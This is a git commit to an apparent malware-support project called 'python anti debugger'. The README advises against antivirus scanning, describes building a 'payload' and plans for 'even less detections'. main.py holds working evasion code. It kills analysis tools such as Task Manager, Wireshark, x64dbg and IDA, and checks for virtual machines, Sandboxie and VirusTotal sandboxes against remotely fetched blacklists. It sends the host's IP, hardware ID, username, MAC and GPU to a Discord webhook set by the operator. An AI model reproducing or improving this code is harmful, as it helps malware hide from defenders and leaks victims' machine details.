afe325319bdf0aa8554e7a144f1f6bdb08c17f51
CookiesKush420 <99442285+Callumgm@users.noreply.github.com>
2022-07-16 20:31:45 +0100

    I am bored

--- README.md
+++ README.md
@@ -1,2 +1,66 @@
-# python-anti-debugger
-basic protection
+<h1 align="center">Welcome to python anti debugger 👋</h1>
+<p align="center">
+  <img src="https://img.shields.io/badge/version-2.0.0-blue.svg?cacheSeconds=2592000" >
+  <img src="https://img.shields.io/badge/Maintained%3F-kinda-yellow.svg" >
+  <img src="https://img.shields.io/github/last-commit/6nz/python-anti-debugger">
+</p>
+<br>
+
+
+
+## :dart: 〢 About ##
+
+> Do not scan the file with any anti-virus otherwise, it will become detected and rendered useless!
+
+Basic but very handy protection against debuggers and much more <br>
+
+## :sparkles: 〢 Features ##
+
+:heavy_check_mark: Anti Debug\
+:heavy_check_mark: Anti Dll Injection\
+:heavy_check_mark: Blocklist IP, HWID, MAC, PCNAME, PCUSERNAME, GPU, PLATFORM
+
+
+## :white_check_mark: 〢 Requirements ##
+
+Before starting :checkered_flag:, you are required to have [Python 3.9.7](https://www.python.org/downloads/release/python-397/) installed and [added to path](https://docs.blender.org/manual/en/latest/_images/about_contribute_install_windows_installer.png).
+
+
+## :file_folder: 〢 Getting Started ##
+
+### Installation ###
+
+Below is how to setup and create a payload.
+
+1. Download or clone the repository
+
+2. Enter your Webhook/API url in `main.py`
+```python
+api = "URL_HERE"
+```
+
+4. Run `main.py`
+
+> Any problems? Create an issue!
+
+
+## :pushpin: 〢 Todo/Enhancements ##
+
+- [x] Kill anti debug proccess instead of closing program
+- [ ] Clean code some more
+- [ ] Remote import commands for even less detections
+
+
+## 👤 〢 Author ##
+
+ 👤 **6nz** 
+   
+
+
+## 🤝 〢 Contributing ##
+Contributions, issues and feature requests are welcome!<br />Feel free to check
+[issues page](https://github.com/6nz/python-anti-debugger/issues).  
+
+
+## 🌟 〢 Show your support ##
+Give a ⭐️ if this project helped you! 
--- main.py
+++ main.py
@@ -1,87 +1,65 @@
-import sys, os, re, ctypes, subprocess, requests
-import uuid
-import platform, wmi, psutil
+import sys, os, re, ctypes, subprocess, requests, uuid, wmi, psutil, threading, time, httpx, platform
+
 from datetime import datetime
-from urllib.request import Request, urlopen
-import dhooks
 from dhooks import Webhook
-import time
-import win32api
-import win32process
-from discord.ext import tasks
-import asyncio
-import threading
+
 
 os.system("cls")
 
+#region Config
+
+api = "URL_HERE"
+
+program_blacklist = [
+    "httpdebuggerui.exe", 
+    "wireshark.exe", 
+    "HTTPDebuggerSvc.exe", 
+    "fiddler.exe", 
+    "regedit.exe", 
+    "taskmgr.exe", 
+    "vboxservice.exe", 
+    "df5serv.exe", 
+    "processhacker.exe", 
+    "vboxtray.exe", 
+    "vmtoolsd.exe", 
+    "vmwaretray.exe", 
+    "ida64.exe", 
+    "ollydbg.exe",
+    "pestudio.exe", 
+    "vmwareuser", 
+    "vgauthservice.exe", 
+    "vmacthlp.exe", 
+    "x96dbg.exe", 
+    "vmsrvc.exe", 
+    "x32dbg.exe", 
+    "vmusrvc.exe", 
+    "prl_cc.exe", 
+    "prl_tools.exe", 
+    "xenservice.exe", 
+    "qemu-ga.exe", 
+    "joeboxcontrol.exe", 
+    "ksdumperclient.exe", 
+    "ksdumper.exe",
+    "joeboxserver.exe"
+]
 
 vmcheck_switch = True
 vtdetect_switch = True
 listcheck_switch = True
 anti_debug_switch = True
+#endregion
 
-def block_debugger():
+
+def anti_debug():
     while True:
         time.sleep(0.7)
         print("Checking for debuggers...")
         for proc in psutil.process_iter():
-            try:
-                processName = proc.name()
-                if processName == "HTTPDebuggerUI.exe":
-                    print("Blacklisted program found! HTTPDebuggerUI.exe")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "HTTPDebuggerSvc.exe":
-                    print("Blacklisted program found! HTTPDebuggerSvc.exe")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "Taskmgr.exe":
-                    print("Blacklisted program found! Task Manager")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "ProcessHacker.exe":
-                    print("Blacklisted program found! ProcessHacker")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "Wireshark.exe":
-                    print("Blacklisted program found! Wireshark")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "OLLYDBG.EXE":
-                    print("Blacklisted program found! OLLYDBG")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "x64dbg.exe":
-                    print("Blacklisted program found! x64dbg")
-                    time.sleep(0)
-                    os._exit(1)   
-                if processName == "x32dbg.exe":
-                    print("Blacklisted program found! x32dbg")
-                    time.sleep(0)
-                    os._exit(1)     
-                if processName == "x96dbg.exe":
-                    print("Blacklisted program found! x96dbg")
-                    time.sleep(0)
-                    os._exit(1)
-                if processName == "ida64.exe":
-                    print("Blacklisted program found! ida64")
-                    time.sleep(0)
-                    os._exit(1)   
-                if processName == "KsDumperClient.exe":
-                    print("Blacklisted program found! KsDumperClient")
-                    time.sleep(0)
-                    os._exit(1) 
-                if processName == "KsDumper.exe":
-                    print("Blacklisted program found! KsDumper")
-                    time.sleep(0)
-                    os._exit(1) 
-                if processName == "pestudio.exe ":
-                    print("Blacklisted program found! pestudio")
-                    time.sleep(0)
-                    os._exit(1)                                                   
-            except:
-                pass
-
+            if any(procstr in proc.name().lower() for procstr in program_blacklist):
+                try:
+                    print("\nBlacklisted program found! Name: "+str(proc.name()))
+                    proc.kill()
+                except(psutil.NoSuchProcess, psutil.AccessDenied): pass
 
 def block_dlls():
     while True:
@@ -92,19 +70,16 @@ def block_dlls():
             print("Sandboxie DLL Detected")
             requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
             os._exit(1)
-        except:
-            pass  
+        except: pass  
 
 def getip():
     ip = "None"
-    try:
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-    except:
-        pass
+    try: ip = requests.get("https://api.ipify.org").text
+    except: pass
     return ip
 
-ip = getip()
 
+ip = getip()
 serveruser = os.getenv("UserName")
 pc_name = os.getenv("COMPUTERNAME")
 mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
@@ -120,7 +95,7 @@ iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-black
 maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
 gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
 platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
-api = ""
+
 
 def vtdetect():
     webhooksend = Webhook(api)
@@ -145,12 +120,11 @@ def vmcheck():
     def in_virtualenv(): 
         return get_base_prefix_compat() != sys.prefix
 
-    if in_virtualenv() == True: # if we are in a vm
+    if in_virtualenv() == True: # If vm is detected
         requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
         os._exit(1) # exit
     
-    else:
-        pass
+    else: pass
 
     def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
         reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
@@ -168,8 +142,7 @@ def vmcheck():
         process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
         processList = []
         for processNames in process.split(" "):
-            if ".exe" in processNames:
-                processList.append(processNames.replace("K\n", "").replace("\n", ""))
+            if ".exe" in processNames: processList.append(processNames.replace("K\n", "").replace("\n", ""))
 
         if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
             print("VMwareService.exe & VMwareTray.exe process are running")
@@ -191,8 +164,8 @@ def vmcheck():
             print("Sandboxie DLL Detected")
             requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
             os._exit(1)
-        except:
-            pass        
+
+        except: pass        
 
     def mac_check():
         mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
@@ -201,6 +174,8 @@ def vmcheck():
             print("VMware MAC Address Detected")
             requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
             os._exit(1)
+
+
     print("[*] Checking VM")
     registry_check()
     processes_and_files_check()
@@ -218,8 +193,7 @@ def listcheck():
             requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
+        else: pass
     except:
         print('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
@@ -232,8 +206,7 @@ def listcheck():
             requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
+        else: pass
     except:
         print('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
@@ -246,8 +219,7 @@ def listcheck():
             requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
+        else: pass
     except:
         print('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
@@ -260,8 +232,7 @@ def listcheck():
             requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
+        else: pass
     except:
         print('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
@@ -274,8 +245,7 @@ def listcheck():
             requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
+        else: pass
     except:
         print('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
@@ -290,34 +260,38 @@ def listcheck():
             requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
             time.sleep(2)
             os._exit(1)
-        else:
-            pass
+        else: pass
     except:
         print('[ERROR]: Failed to connect to database.')
         time.sleep(2) 
         os._exit(1)
 
-if anti_debug_switch == True:
-    try:
-        b = threading.Thread(name='Anti-Debug', target=block_debugger)
-        b.start()
-        b2 = threading.Thread(name='Anti-DLL', target=block_dlls)
-        b2.start()
-    except:
-        pass
-else:
-    pass
+
+def main():
+    if anti_debug_switch == True:
+        try:
+            threading.Thread(name='Anti-Debug', target=anti_debug).start()
+            threading.Thread(name='Anti-DLL', target=block_dlls).start()
+        except: pass
+    else: pass
+
+    if vtdetect_switch == True: vtdetect()      # VTDETECT
+    else: pass
+
+    if vmcheck_switch == True: vmcheck()        # VMCHECK
+    else: pass
+
+    if listcheck_switch == True: listcheck()    # LISTCHECK
+    else: pass
 
 
-if vtdetect_switch == True:
-    vtdetect()
-else:
-    pass
-if vmcheck_switch == True:
-    vmcheck()
-else:
-    pass
-if listcheck_switch == True:
-    listcheck()
-else:
-    pass
+
+'''
+Check if the script is available to connect to the internet.
+'''
+if __name__ == '__main__': 
+    if platform.system() == 'Windows':
+        try: httpx.get('https://google.com')
+        except (httpx.NetworkError, httpx.TimeoutException): os._exit(1)
+        main()
+    else: os._exit(1)
